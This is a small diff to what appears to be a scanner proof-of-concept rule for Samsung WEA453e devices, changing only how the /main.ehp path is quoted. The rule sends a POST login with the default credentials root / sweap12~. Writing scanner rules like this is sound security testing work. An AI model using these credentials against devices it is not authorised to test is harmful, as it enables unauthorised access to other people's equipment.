@@ -1,7 +1,7 @@
 name: poc-yaml-samsung-wea453e-default-pwd
 rules:
   - method: POST
-    path: "/main.ehp"
+    path: /main.ehp
     follow_redirects: false
     body: |
       httpd;General;lang=en&login_id=root&login_pw=sweap12~ 
